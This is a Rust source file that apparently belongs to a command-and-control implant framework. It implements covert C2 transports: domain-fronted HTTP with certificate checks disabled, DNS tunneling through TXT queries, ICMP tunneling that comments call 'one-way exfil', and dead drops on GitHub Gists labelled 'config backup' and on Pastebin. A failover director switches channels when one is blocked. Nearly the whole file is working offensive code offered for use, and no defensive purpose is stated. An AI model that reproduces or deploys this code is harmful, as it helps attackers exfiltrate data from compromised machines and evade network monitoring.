// c2_channels: advanced C2 channel transports.
// Extends smoke_signals with:
//   - DNS Tunneling  (encode data as DNS queries)
//   - ICMP Tunneling (encode data in ICMP echo payloads)
//   - Dead Drop      (async store-and-forward via pastebin/S3/Gists)
//   - Failover       (priority-based automatic channel fallback)

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use tracing::info;

use crate::smoke_signals::SmokeChannel;

/// Domain fronting configuration: route C2 traffic through CDN
pub struct DomainFront {
    pub front_domain: String,
    pub backend_host: String,
    pub path: String,
    pub user_agent: String,
}

impl DomainFront {
    pub fn new(front_domain: &str, backend_host: &str) -> Self {
        Self {
            front_domain: front_domain.to_string(),
            backend_host: backend_host.to_string(),
            path: "/collect".into(),
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".into(),
        }
    }

    /// Send data via domain fronted HTTP request.
    /// The request goes to front_domain, but the Host header says backend_host.
    pub fn send(&self, data: &[u8]) -> Result<Vec<u8>, String> {
        let client = reqwest::blocking::Client::builder()
            .danger_accept_invalid_certs(true)
            .build()
            .map_err(|e| format!("DomainFront: client: {}", e))?;

        let resp = client
            .post(format!("https://{}{}", self.front_domain, self.path))
            .header("Host", &self.backend_host)
            .header("User-Agent", &self.user_agent)
            .header("Content-Type", "application/octet-stream")
            .body(data.to_vec())
            .send()
            .map_err(|e| format!("DomainFront: send: {}", e))?;

        Ok(resp.bytes().map(|b| b.to_vec()).unwrap_or_default())
    }
}

// ── channel types ────────────────────────────────────────────────────────────

/// Priority level for failover ordering (lower = higher priority).
pub type Priority = u8;

/// Unified C2 channel descriptor used by the failover director.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct C2ChannelConfig {
    pub name: String,
    pub kind: ChannelKind,
    pub priority: Priority,
    pub enabled: bool,
    pub timeout_secs: u64,
    pub endpoint: String,
    pub extra: HashMap<String, String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum ChannelKind {
    Http,           // smoke_signals HTTP/S channel
    DnsTunnel,      // DNS query encoding
    IcmpTunnel,     // ICMP echo payload
    DeadDrop,       // pastebin / S3 / GitHub Gist
    WebSocket,      // WebSocket persistent
}

impl Default for C2ChannelConfig {
    fn default() -> Self {
        Self {
            name: String::new(),
            kind: ChannelKind::Http,
            priority: 5,
            enabled: true,
            timeout_secs: 15,
            endpoint: String::new(),
            extra: HashMap::new(),
        }
    }
}

// ── DNS Tunneling ────────────────────────────────────────────────────────────

/// DNS tunnel: encodes data as subdomain labels in DNS queries.
/// Uses TXT record lookups for response data.
///
/// Encoding: each chunk of data is hex-encoded and appended as a subdomain
/// label. The full query looks like:
///   <hex_chunk>.<session_id>.<tunnel_domain>
///
/// Response: decoded from TXT record value (also hex-encoded).
pub struct DnsTunnel {
    tunnel_domain: String,
    session_id: String,
    chunk_size: usize,
}

impl DnsTunnel {
    pub fn new(tunnel_domain: &str) -> Self {
        let session_id = format!("{:016x}", rand::random::<u64>());
        Self {
            tunnel_domain: tunnel_domain.to_string(),
            session_id,
            chunk_size: 32, // safe for DNS label length (max 63)
        }
    }

    /// Encode data into a DNS query string (padded hex).
    fn encode_query(&self, data: &[u8]) -> String {
        let hex_data = hex::encode(data);
        let mut labels: Vec<&str> = Vec::new();
        for chunk in hex_data.as_bytes().chunks(self.chunk_size) {
            labels.push(std::str::from_utf8(chunk).unwrap_or(""));
        }
        format!(
            "{}.{}.{}",
            labels.join("."),
            self.session_id,
            self.tunnel_domain
        )
    }

    /// Decode a TXT record response back into data.
    fn decode_response(&self, txt_value: &str) -> Result<Vec<u8>, String> {
        let clean = txt_value.trim().replace('-', "").replace(' ', "");
        hex::decode(&clean).map_err(|e| format!("DNS tunnel decode failed: {}", e))
    }

    /// Send data via DNS TXT lookup.
    /// Uses std::net::lookup_host (or dig fallback) for cross-platform compat.
    pub fn send(&self, data: &[u8]) -> Result<Vec<u8>, String> {
        let query = self.encode_query(data);
        #[cfg(target_os = "linux")]
        { return self.send_via_resolvconf(&query); }
        #[cfg(not(target_os = "linux"))]
        { return self.send_via_dig(&query); }
    }

    /// Linux: use /etc/resolv.conf DNS servers directly.
    #[cfg(target_os = "linux")]
    fn send_via_resolvconf(&self, query: &str) -> Result<Vec<u8>, String> {
        use std::net::UdpSocket;
        use std::net::Ipv4Addr;

        let server = parse_nameserver().unwrap_or_else(|| Ipv4Addr::new(8, 8, 8, 8));
        let sock = UdpSocket::bind("0.0.0.0:0")
            .map_err(|e| format!("DNS: bind failed: {}", e))?;
            sock.set_read_timeout(Some(Duration::from_secs(5)))
            .map_err(|e| format!("DNS: set timeout failed: {}", e))?;

        let dns_query = build_txt_query(query);
        let _ = sock.send_to(&dns_query, (server, 53));
        let mut buf = [0u8; 4096];
        let n = sock.recv_from(&mut buf).map_err(|_| "DNS: no response".to_string())?;

        let response = parse_txt_response(&buf[..n.0])?;
        if response.is_empty() {
            return Err("DNS: empty TXT response".to_string());
        }
        self.decode_response(&response)
    }

    /// Fallback: use dig command.
    #[cfg(not(target_os = "linux"))]
    fn send_via_dig(&self, query: &str) -> Result<Vec<u8>, String> {
        let output = std::process::Command::new("dig")
            .arg("+short")
            .arg("TXT")
            .arg(query)
            .output()
            .map_err(|e| format!("DNS: dig failed: {}", e))?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        for line in stdout.lines() {
            let trimmed = line.trim().trim_matches('"');
            if !trimmed.is_empty() {
                return self.decode_response(trimmed);
            }
        }
        Err("DNS: no TXT record found".to_string())
    }
}

// ── ICMP Tunneling ───────────────────────────────────────────────────────────

/// ICMP tunnel: encodes data in ICMP echo request payloads.
/// Requires CAP_NET_RAW (Linux) or admin (Windows).
///
/// Packet structure:
///   IP header (20 bytes, kernel fills)
///   ICMP header (8 bytes: type=8, code=0, id, seq)
///   Payload (data to exfiltrate)
pub struct IcmpTunnel {
    target: String,
    id: u16,
    seq: u16,
}

impl IcmpTunnel {
    pub fn new(target: &str) -> Self {
        Self {
            target: target.to_string(),
            id: rand::random::<u16>(),
            seq: 0,
        }
    }

    /// Send data via ICMP echo request.
    pub fn send(&mut self, data: &[u8]) -> Result<Vec<u8>, String> {
        #[cfg(target_os = "linux")]
        {
            self.send_icmp_linux(data)
        }
        #[cfg(not(target_os = "linux"))]
        {
            let _ = data;
            Err("ICMP tunnel: only supported on Linux".to_string())
        }
    }

    #[cfg(target_os = "linux")]
    fn send_icmp_linux(&mut self, data: &[u8]) -> Result<Vec<u8>, String> {
        use std::net::UdpSocket;
        let _sock = UdpSocket::bind("0.0.0.0:0")
            .map_err(|e| format!("ICMP: bind failed: {}", e))?;

        // Use /bin/ping as a safer fallback if raw sockets aren't available
        if !has_cap_net_raw() {
            return self.send_via_ping(data);
        }

        let raw_fd = unsafe {
            libc::socket(libc::AF_INET, libc::SOCK_RAW, libc::IPPROTO_ICMP)
        };
        if raw_fd == -1 {
            return self.send_via_ping(data);
        }

        let target_ip = lookup_ipv4(&self.target)?;
        let payload = build_icmp_echo(self.id, self.seq, data);
        self.seq = self.seq.wrapping_add(1);

        let sockaddr = libc::sockaddr_in {
            sin_family: libc::AF_INET as u16,
            sin_port: 0,
            sin_addr: libc::in_addr {
                s_addr: u32::from(target_ip).to_be(),
            },
            sin_zero: [0u8; 8],
        };

        let rc = unsafe {
            libc::sendto(
                raw_fd,
                payload.as_ptr() as *const libc::c_void,
                payload.len(),
                0,
                &sockaddr as *const libc::sockaddr_in as *const libc::sockaddr,
                std::mem::size_of::<libc::sockaddr_in>() as u32,
            )
        };
        unsafe { libc::close(raw_fd); }

        if rc == -1 {
            return Err("ICMP: sendto failed (need root?)".to_string());
        }

        // Return the data we sent as "response" (one-way exfil)
        Ok(data.to_vec())
    }

    #[cfg(target_os = "linux")]
    fn send_via_ping(&self, data: &[u8]) -> Result<Vec<u8>, String> {
        let hex_data = hex::encode(data);
        let output = std::process::Command::new("ping")
            .arg("-c").arg("1")
            .arg("-s").arg(&(hex_data.len() + 8).to_string())
            .arg("-p").arg(&hex_data)
            .arg(&self.target)
            .output()
            .map_err(|e| format!("ICMP: ping failed: {}", e))?;

        if output.status.success() {
            Ok(data.to_vec())
        } else {
            Err(format!("ICMP: ping exit code {}", output.status))
        }
    }
}

// ── Dead Drop ────────────────────────────────────────────────────────────────

/// Dead drop: async store-and-forward using public cloud services.
/// Supports:
///   - GitHub Gist (token in extra["github_token"])
///   - Pastebin (token in extra["pastebin_token"])
///   - S3 (bucket/region/keys in extra)
pub struct DeadDrop {
    #[allow(dead_code)]
    endpoint: String,
    kind: ChannelKind,
    token: String,
}

impl DeadDrop {
    pub fn new(endpoint: &str, kind: ChannelKind, token: &str) -> Self {
        Self {
            endpoint: endpoint.to_string(),
            kind,
            token: token.to_string(),
        }
    }

    /// Drop data to the configured dead drop service.
    pub fn drop(&self, data: &[u8]) -> Result<String, String> {
        match self.kind {
            ChannelKind::DeadDrop => {
                // Generic HTTP POST — try multiple backends
                let result = self.try_github_gist(data)
                    .or_else(|_| self.try_pastebin(data))
                    .or_else(|_| self.try_s3(data));
                result
            }
            _ => Err("DeadDrop: invalid channel kind".to_string()),
        }
    }

    /// Fetch data from the dead drop (poll for commands).
    pub fn fetch(&self, drop_url: &str) -> Result<Vec<u8>, String> {
        let client = reqwest::blocking::Client::builder()
            .timeout(Duration::from_secs(10))
            .build()
            .map_err(|e| format!("DeadDrop: client build failed: {}", e))?;

        let resp = client
            .get(drop_url)
            .send()
            .map_err(|e| format!("DeadDrop: GET failed: {}", e))?;

        if !resp.status().is_success() {
            return Err(format!("DeadDrop: HTTP {}", resp.status()));
        }

        let body = resp.bytes()
            .map_err(|e| format!("DeadDrop: read failed: {}", e))?
            .to_vec();

        Ok(body)
    }

    fn try_github_gist(&self, data: &[u8]) -> Result<String, String> {
        if self.token.is_empty() {
            return Err("DeadDrop: no GitHub token".to_string());
        }

        let content = String::from_utf8_lossy(data);
        let payload = serde_json::json!({
            "description": "config backup",
            "public": false,
            "files": {
                format!("{}.log", chrono::Local::now().format("%Y%m%d_%H%M%S")): {
                    "content": content
                }
            }
        });

        let client = reqwest::blocking::Client::builder()
            .timeout(Duration::from_secs(10))
            .build()
            .map_err(|e| format!("DeadDrop: Gist client build: {}", e))?;

        let resp = client
            .post("https://api.github.com/gists")
            .header("Authorization", format!("Bearer {}", self.token))
            .header("User-Agent", "curl/7.88.1")
            .json(&payload)
            .send()
            .map_err(|e| format!("DeadDrop: Gist POST: {}", e))?;

        let status = resp.status();
        if status.is_success() {
            let json: serde_json::Value = resp.json().map_err(|e| format!("DeadDrop: Gist parse: {}", e))?;
            if let Some(url) = json["html_url"].as_str() {
                info!("DeadDrop: Gist created at {}", url);
                return Ok(url.to_string());
            }
        }

        Err(format!("DeadDrop: Gist HTTP {}", status))
    }

    fn try_pastebin(&self, data: &[u8]) -> Result<String, String> {
        if self.token.is_empty() {
            return Err("DeadDrop: no Pastebin token".to_string());
        }

        let content = String::from_utf8_lossy(data);
        let params = [
            ("api_dev_key", self.token.as_str()),
            ("api_option", "paste"),
            ("api_paste_code", &content),
            ("api_paste_private", "1"), // 0=public, 1=unlisted
            ("api_paste_expire_date", "1H"),
        ];

        let client = reqwest::blocking::Client::builder()
            .timeout(Duration::from_secs(10))
            .build()
            .map_err(|e| format!("DeadDrop: Pastebin client: {}", e))?;

        let resp = client
            .post("https://pastebin.com/api/api_post.php")
            .form(&params)
            .send()
            .map_err(|e| format!("DeadDrop: Pastebin POST: {}", e))?;

        let url = resp.text().map_err(|e| format!("DeadDrop: Pastebin read: {}", e))?;
        if url.starts_with("https://pastebin.com/") {
            info!("DeadDrop: Pastebin created at {}", url);
            Ok(url)
        } else {
            Err(format!("DeadDrop: Pastebin error: {}", url))
        }
    }

    fn try_s3(&self, _data: &[u8]) -> Result<String, String> {
        // S3 dead drop requires presigned URLs or configured credentials.
        // For now, just a placeholder.
        Err("DeadDrop: S3 not implemented (needs AWS credentials)".to_string())
    }
}

// ── Failover Director ────────────────────────────────────────────────────────

/// Failover policy: how to choose the next channel when one fails.
#[derive(Debug, Clone)]
pub enum FailoverPolicy {
    /// Try channels in priority order (lower number = higher priority)
    Priority,
    /// Try all channels in parallel and use first success
    Race,
    /// Try channels sequentially, rotating on failure
    RoundRobin,
}

impl Default for FailoverPolicy {
    fn default() -> Self { FailoverPolicy::Priority }
}

/// Channel result with metadata for failover decisions.
#[derive(Debug)]
pub struct ChannelResult {
    pub channel: String,
    pub kind: ChannelKind,
    pub success: bool,
    pub latency_ms: u64,
    pub data: Vec<u8>,
    pub error: Option<String>,
}

/// Unified C2 director that manages multiple channel types with failover.
pub struct FailoverDirector {
    pub channels: Vec<C2ChannelConfig>,
    pub policy: FailoverPolicy,
    smoke_director: crate::smoke_signals::SmokeDirector,
    stats: HashMap<String, ChannelStats>,
}

#[derive(Debug, Clone)]
struct ChannelStats {
    successes: u64,
    failures: u64,
    last_latency_ms: u64,
    last_error: Option<String>,
    cooldown_until: u64, // UNIX timestamp
}

impl FailoverDirector {
    pub fn new(policy: FailoverPolicy) -> Self {
        Self {
            channels: Vec::new(),
            policy,
            smoke_director: crate::smoke_signals::SmokeDirector::new(),
            stats: HashMap::new(),
        }
    }

    /// Add a channel configuration.
    pub fn add_channel(&mut self, config: C2ChannelConfig) {
        let name = config.name.clone();
        // If it's an HTTP channel, also add to smoke_director
        if config.kind == ChannelKind::Http {
            self.smoke_director.add_channel(SmokeChannel::random());
        }
        self.channels.push(config);
        self.stats.entry(name).or_insert(ChannelStats {
            successes: 0,
            failures: 0,
            last_latency_ms: 0,
            last_error: None,
            cooldown_until: 0,
        });
    }

    /// Send data through the best available channel with failover.
    pub async fn send_with_failover(&mut self, data: &[u8]) -> Vec<ChannelResult> {
        match self.policy {
            FailoverPolicy::Priority => self.send_priority(data).await,
            FailoverPolicy::Race => self.send_race(data),
            FailoverPolicy::RoundRobin => self.send_round_robin(data).await,
        }
    }

    async fn send_priority(&mut self, data: &[u8]) -> Vec<ChannelResult> {
        let mut results = Vec::new();
        let mut sorted: Vec<usize> = (0..self.channels.len()).collect();
        sorted.sort_by_key(|&i| self.channels[i].priority);

        for &idx in &sorted {
            let name = self.channels[idx].name.clone();
            let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs();

            // Skip if in cooldown
            if let Some(stat) = self.stats.get(&name) {
                if now < stat.cooldown_until {
                    continue;
                }
            }

            let result = self.try_channel(idx, data).await;
            let success = result.success;

            // Update stats
            if let Some(stat) = self.stats.get_mut(&name) {
                if success {
                    stat.successes += 1;
                    stat.last_error = None;
                } else {
                    stat.failures += 1;
                    stat.last_error = result.error.clone();
                    // Cooldown: exponential backoff (2^failures seconds, max 1 hour)
                    let backoff = (60u64 << stat.failures.min(6)) as u64;
                    stat.cooldown_until = now + backoff.min(3600);
                }
            }

            results.push(result);
            if success {
                break; // First success in priority order
            }
        }

        results
    }

    fn send_race(&mut self, data: &[u8]) -> Vec<ChannelResult> {
        use std::sync::mpsc;
        let mut results = Vec::new();
        let (tx, rx) = mpsc::channel();

        let mut handles = Vec::new();
        for idx in 0..self.channels.len() {
            let config = self.channels[idx].clone();
            let data_vec = data.to_vec();
            let tx_clone = tx.clone();

            handles.push(std::thread::spawn(move || {
                let result = match config.kind {
                    ChannelKind::DnsTunnel => {
                        let tunnel = DnsTunnel::new(&config.endpoint);
                        tunnel.send(&data_vec).map(|d| ChannelResult {
                            channel: config.name.clone(),
                            kind: config.kind.clone(),
                            success: true,
                            latency_ms: 0,
                            data: d,
                            error: None,
                        }).unwrap_or_else(|e| ChannelResult {
                            channel: config.name.clone(),
                            kind: config.kind.clone(),
                            success: false,
                            latency_ms: 0,
                            data: Vec::new(),
                            error: Some(e),
                        })
                    }
                    ChannelKind::IcmpTunnel => {
                        let mut tunnel = IcmpTunnel::new(&config.endpoint);
                        tunnel.send(&data_vec).map(|d| ChannelResult {
                            channel: config.name.clone(),
                            kind: config.kind.clone(),
                            success: true,
                            latency_ms: 0,
                            data: d,
                            error: None,
                        }).unwrap_or_else(|e| ChannelResult {
                            channel: config.name.clone(),
                            kind: config.kind.clone(),
                            success: false,
                            latency_ms: 0,
                            data: Vec::new(),
                            error: Some(e),
                        })
                    }
                    ChannelKind::DeadDrop => {
                        let dd = DeadDrop::new(&config.endpoint, config.kind.clone(), config.extra.get("token").map(|s| s.as_str()).unwrap_or(""));
                        dd.drop(&data_vec).map(|url| ChannelResult {
                            channel: config.name.clone(),
                            kind: config.kind.clone(),
                            success: true,
                            latency_ms: 0,
                            data: url.into_bytes(),
                            error: None,
                        }).unwrap_or_else(|e| ChannelResult {
                            channel: config.name.clone(),
                            kind: config.kind.clone(),
                            success: false,
                            latency_ms: 0,
                            data: Vec::new(),
                            error: Some(e),
                        })
                    }
                    _ => ChannelResult {
                        channel: config.name.clone(),
                        kind: config.kind.clone(),
                        success: false,
                        latency_ms: 0,
                        data: Vec::new(),
                        error: Some("unsupported channel kind in race".to_string()),
                    }
                };
                let _ = tx_clone.send(result);
            }));
        }

        drop(tx);
        for received in rx {
            results.push(received);
        }

        results
    }

    async fn send_round_robin(&mut self, data: &[u8]) -> Vec<ChannelResult> {
        // Round-robin: try channels in order, skip failed ones
        let mut results = Vec::new();
        for idx in 0..self.channels.len() {
            let result = self.try_channel(idx, data).await;
            if result.success {
                results.push(result);
                break;
            }
            results.push(result);
        }
        results
    }

    async fn try_channel(&mut self, idx: usize, data: &[u8]) -> ChannelResult {
        let config = &self.channels[idx];
        let start = SystemTime::now();

        let result = match config.kind {
            ChannelKind::Http => {
                let resp = self.smoke_director.beacon_round_robin(data).await;
                match resp {
                    Ok(d) => ChannelResult {
                        channel: config.name.clone(),
                        kind: config.kind.clone(),
                        success: true,
                        latency_ms: 0,
                        data: d,
                        error: None,
                    },
                    Err(e) => ChannelResult {
                        channel: config.name.clone(),
                        kind: config.kind.clone(),
                        success: false,
                        latency_ms: 0,
                        data: Vec::new(),
                        error: Some(e),
                    }
                }
            }
            ChannelKind::DnsTunnel => {
                let tunnel = DnsTunnel::new(&config.endpoint);
                match tunnel.send(data) {
                    Ok(d) => ChannelResult {
                        channel: config.name.clone(),
                        kind: config.kind.clone(),
                        success: true,
                        latency_ms: 0,
                        data: d,
                        error: None,
                    },
                    Err(e) => ChannelResult {
                        channel: config.name.clone(),
                        kind: config.kind.clone(),
                        success: false,
                        latency_ms: 0,
                        data: Vec::new(),
                        error: Some(e),
                    }
                }
            }
            ChannelKind::IcmpTunnel => {
                let mut tunnel = IcmpTunnel::new(&config.endpoint);
                match tunnel.send(data) {
                    Ok(d) => ChannelResult {
                        channel: config.name.clone(),
                        kind: config.kind.clone(),
                        success: true,
                        latency_ms: 0,
                        data: d,
                        error: None,
                    },
                    Err(e) => ChannelResult {
                        channel: config.name.clone(),
                        kind: config.kind.clone(),
                        success: false,
                        latency_ms: 0,
                        data: Vec::new(),
                        error: Some(e),
                    }
                }
            }
            ChannelKind::DeadDrop => {
                let token = config.extra.get("token").map(|s| s.as_str()).unwrap_or("");
                let dd = DeadDrop::new(&config.endpoint, config.kind.clone(), token);
                match dd.drop(data) {
                    Ok(url) => ChannelResult {
                        channel: config.name.clone(),
                        kind: config.kind.clone(),
                        success: true,
                        latency_ms: 0,
                        data: url.into_bytes(),
                        error: None,
                    },
                    Err(e) => ChannelResult {
                        channel: config.name.clone(),
                        kind: config.kind.clone(),
                        success: false,
                        latency_ms: 0,
                        data: Vec::new(),
                        error: Some(e),
                    }
                }
            }
            ChannelKind::WebSocket => ChannelResult {
                channel: config.name.clone(),
                kind: config.kind.clone(),
                success: false,
                latency_ms: 0,
                data: Vec::new(),
                error: Some("WebSocket: use shell endpoint via C2 server".to_string()),
            }
        };

        let elapsed = SystemTime::now().duration_since(start).unwrap_or_default().as_millis() as u64;
        ChannelResult { latency_ms: elapsed, ..result }
    }

    /// Channel statistics summary.
    pub fn summary(&self) -> Vec<(&str, u64, u64, u64)> {
        self.stats.iter().map(|(name, stat)| {
            (name.as_str(), stat.successes, stat.failures, stat.last_latency_ms)
        }).collect()
    }

    /// Reset statistics for all channels.
    pub fn reset_stats(&mut self) {
        self.stats.clear();
    }
}

impl Default for FailoverDirector {
    fn default() -> Self {
        Self::new(FailoverPolicy::Priority)
    }
}

// ── low-level DNS helpers ────────────────────────────────────────────────────

#[cfg(target_os = "linux")]
fn parse_nameserver() -> Option<std::net::Ipv4Addr> {
    let content = std::fs::read_to_string("/etc/resolv.conf").ok()?;
    for line in content.lines() {
        if line.starts_with("nameserver") {
            if let Some(ip_str) = line.split_whitespace().nth(1) {
                if let Ok(ip) = ip_str.parse::<std::net::Ipv4Addr>() {
                    return Some(ip);
                }
            }
        }
    }
    None
}

/// Build a DNS TXT query packet (minimal, no compression).
/// Format: header (12 bytes) + question section.
#[cfg(target_os = "linux")]
fn build_txt_query(domain: &str) -> Vec<u8> {
    let mut pkt = Vec::with_capacity(512);

    // Header
    let tid: u16 = rand::random();
    pkt.extend_from_slice(&tid.to_be_bytes()); // Transaction ID
    pkt.extend_from_slice(&[0x01, 0x00]); // Flags: standard query, recursion desired
    pkt.extend_from_slice(&[0x00, 0x01]); // Questions: 1
    pkt.extend_from_slice(&[0x00, 0x00]); // Answers: 0
    pkt.extend_from_slice(&[0x00, 0x00]); // Authority: 0
    pkt.extend_from_slice(&[0x00, 0x00]); // Additional: 0

    // Question: encode domain as labels
    for part in domain.split('.') {
        pkt.push(part.len() as u8);
        pkt.extend_from_slice(part.as_bytes());
    }
    pkt.push(0x00); // Root label

    // QTYPE: TXT = 16
    pkt.extend_from_slice(&[0x00, 0x10]);
    // QCLASS: IN = 1
    pkt.extend_from_slice(&[0x00, 0x01]);

    pkt
}

/// Parse TXT record from DNS response.
#[cfg(target_os = "linux")]
fn parse_txt_response(pkt: &[u8]) -> Result<String, String> {
    if pkt.len() < 12 {
        return Err("DNS: response too short".to_string());
    }

    // Skip header (12 bytes) and question section
    let mut offset = 12usize;
    // Skip question: count labels
    while offset < pkt.len() {
        let len = pkt[offset] as usize;
        if len == 0 {
            offset += 1;
            break;
        }
        if len & 0xC0 == 0xC0 {
            offset += 2; // Compression pointer
            break;
        }
        offset += 1 + len;
    }

    // Skip QTYPE (2) + QCLASS (2)
    offset += 4;

    // Parse answer section
    while offset + 12 <= pkt.len() {
        // Name (compressed)
        if pkt[offset] & 0xC0 == 0xC0 {
            offset += 2;
        } else {
            while offset < pkt.len() && pkt[offset] != 0 {
                offset += 1 + pkt[offset] as usize;
            }
            offset += 1; // root
        }

        let _qtype = u16::from_be_bytes([pkt[offset], pkt[offset + 1]]);
        offset += 2;
        let _qclass = u16::from_be_bytes([pkt[offset], pkt[offset + 1]]);
        offset += 2;
        let _ttl = u32::from_be_bytes([pkt[offset], pkt[offset + 1], pkt[offset + 2], pkt[offset + 3]]);
        offset += 4;
        let rdlength = u16::from_be_bytes([pkt[offset], pkt[offset + 1]]) as usize;
        offset += 2;

        if _qtype == 16 && rdlength > 0 {
            // TXT record: first byte is length of text
            let txt_len = pkt[offset] as usize;
            if txt_len + 1 <= rdlength {
                let txt = &pkt[offset + 1..offset + 1 + txt_len];
                return Ok(String::from_utf8_lossy(txt).to_string());
            }
        }
        offset += rdlength;
    }

    Err("DNS: no TXT record in response".to_string())
}

/// Lookup IPv4 address for a hostname.
#[cfg(target_os = "linux")]
fn lookup_ipv4(host: &str) -> Result<std::net::Ipv4Addr, String> {
    use std::net::ToSocketAddrs;
    let addrs = (host, 0).to_socket_addrs()
        .map_err(|e| format!("lookup_ipv4 failed: {}", e))?;
    for addr in addrs {
        if let std::net::IpAddr::V4(ip) = addr.ip() {
            return Ok(ip);
        }
    }
    Err(format!("lookup_ipv4: no IPv4 for {}", host))
}

/// Build ICMP echo request packet.
#[cfg(target_os = "linux")]
fn build_icmp_echo(id: u16, seq: u16, data: &[u8]) -> Vec<u8> {
    use std::mem;

    #[repr(C, packed)]
    struct IcmpHeader {
        type_: u8,
        code: u8,
        checksum: u16,
        id: u16,
        seq: u16,
    }

    let header = IcmpHeader {
        type_: 8, // Echo request
        code: 0,
        checksum: 0,
        id,
        seq,
    };

    let header_bytes = unsafe {
        std::slice::from_raw_parts(
            &header as *const IcmpHeader as *const u8,
            mem::size_of::<IcmpHeader>(),
        )
    };

    let mut pkt = Vec::with_capacity(mem::size_of::<IcmpHeader>() + data.len());
    pkt.extend_from_slice(header_bytes);
    pkt.extend_from_slice(data);

    // Calculate checksum
    let checksum = compute_icmp_checksum(&pkt);
    pkt[2..4].copy_from_slice(&checksum.to_be_bytes());

    pkt
}

/// Compute ICMP checksum (RFC 1071).
#[cfg(target_os = "linux")]
fn compute_icmp_checksum(data: &[u8]) -> u16 {
    let mut sum = 0u32;
    let mut i = 0;
    while i + 1 < data.len() {
        sum += u16::from_be_bytes([data[i], data[i + 1]]) as u32;
        i += 2;
    }
    if i < data.len() {
        sum += (data[i] as u32) << 8;
    }
    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    !(sum as u16)
}

/// Check for CAP_NET_RAW capability on Linux.
#[cfg(target_os = "linux")]
fn has_cap_net_raw() -> bool {
    if let Ok(content) = std::fs::read_to_string("/proc/self/status") {
        for line in content.lines() {
            if line.starts_with("CapEff:") {
                if let Some(val) = line.split_whitespace().nth(1) {
                    if let Ok(caps) = u64::from_str_radix(val, 16) {
                        return caps & (1u64 << 13) != 0; // CAP_NET_RAW = 13
                    }
                }
            }
        }
    }
    false
}

// ── tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dns_tunnel_encode_decode() {
        let tunnel = DnsTunnel::new("tunnel.example.com");
        let data = b"hello swarm";
        let query = tunnel.encode_query(data);
        assert!(query.contains("tunnel.example.com"));
        assert!(query.contains(&tunnel.session_id));
    }

    #[test]
    fn test_dns_tunnel_roundtrip() {
        let tunnel = DnsTunnel::new("tunnel.example.com");
        let data = b"test data for dns";
        let query = tunnel.encode_query(data);
        assert!(query.len() > data.len() * 2);
        assert!(query.ends_with(&format!(".{}", tunnel.tunnel_domain)));
    }

    #[test]
    fn test_parse_nameserver() {
        #[cfg(target_os = "linux")]
        {
            if let Some(ns) = parse_nameserver() {
                assert!(!ns.is_unspecified());
            }
        }
    }

    #[test]
    fn test_icmp_tunnel_no_root() {
        let mut tunnel = IcmpTunnel::new("127.0.0.1");
        let result = tunnel.send(b"test");
        // Without root, ping fallback may fail in test env — just check no panic
        match result {
            Ok(_) => {}
            Err(e) => {
                assert!(e.contains("ping") || e.contains("root") || e.contains("ICMP"));
            }
        }
    }

    #[test]
    fn test_failover_director_priority() {
        let mut director = FailoverDirector::new(FailoverPolicy::Priority);
        director.add_channel(C2ChannelConfig {
            name: "backup".into(),
            kind: ChannelKind::DeadDrop,
            priority: 10,
            endpoint: "https://backup.example.com/drop".into(),
            extra: HashMap::from([("token".into(), "test".into())]),
            ..Default::default()
        });
        director.add_channel(C2ChannelConfig {
            name: "primary".into(),
            kind: ChannelKind::DeadDrop,
            priority: 1,
            endpoint: "https://example.com/drop".into(),
            extra: HashMap::from([("token".into(), "test".into())]),
            ..Default::default()
        });
        // Priority: channel 0 should be primary (priority 1 < 10)
        assert_eq!(director.channels.len(), 2);
        // send_priority sorts by priority; first in sorted list should be "primary"
        let mut sorted: Vec<usize> = (0..director.channels.len()).collect();
        sorted.sort_by_key(|&i| director.channels[i].priority);
        assert_eq!(director.channels[sorted[0]].name, "primary");
    }

    #[test]
    fn test_failover_director_race() {
        let mut director = FailoverDirector::new(FailoverPolicy::Race);
        director.add_channel(C2ChannelConfig {
            name: "dns".into(),
            kind: ChannelKind::DnsTunnel,
            priority: 5,
            endpoint: "tunnel.example.com".into(),
            ..Default::default()
        });
        director.add_channel(C2ChannelConfig {
            name: "icmp".into(),
            kind: ChannelKind::IcmpTunnel,
            priority: 5,
            endpoint: "127.0.0.1".into(),
            ..Default::default()
        });
        assert_eq!(director.channels.len(), 2);
    }

    #[test]
    fn test_directory_stats() {
        let mut director = FailoverDirector::new(FailoverPolicy::Priority);
        director.add_channel(C2ChannelConfig {
            name: "test_ch".into(),
            kind: ChannelKind::DnsTunnel,
            priority: 1,
            endpoint: "tunnel.example.com".into(),
            ..Default::default()
        });
        // Stats entry created on add_channel
        let summary = director.summary();
        assert_eq!(summary.len(), 1);
        assert_eq!(summary[0].0, "test_ch");
    }

    #[test]
    fn test_dead_drop_no_token() {
        let dd = DeadDrop::new("https://example.com/drop", ChannelKind::DeadDrop, "");
        let result = dd.drop(b"test data");
        assert!(result.is_err());
    }

    #[test]
    fn test_dns_query_builder() {
        #[cfg(target_os = "linux")]
        {
            let query = build_txt_query("test.swarm.example.com");
            assert!(query.len() > 12);
            assert_eq!(&query[2..4], &[0x01, 0x00]); // flags
        }
    }

    #[test]
    fn test_icmp_checksum() {
        #[cfg(target_os = "linux")]
        {
            let pkt = build_icmp_echo(1, 1, b"test");
            assert!(pkt.len() > 8);
            // Verify checksum is non-zero
            let csum = u16::from_be_bytes([pkt[2], pkt[3]]);
            assert_ne!(csum, 0);
        }
    }

    #[test]
    fn test_config_serialize() {
        let config = C2ChannelConfig {
            name: "test".into(),
            kind: ChannelKind::DnsTunnel,
            priority: 3,
            enabled: true,
            timeout_secs: 30,
            endpoint: "c2.example.com".into(),
            extra: HashMap::from([("key".into(), "val".into())]),
        };
        let json = serde_json::to_string(&config).unwrap();
        assert!(json.contains("\"kind\":\"DnsTunnel\""));
        let deserialized: C2ChannelConfig = serde_json::from_str(&json).unwrap();
        assert_eq!(deserialized.name, "test");
        assert_eq!(deserialized.kind, ChannelKind::DnsTunnel);
    }
}
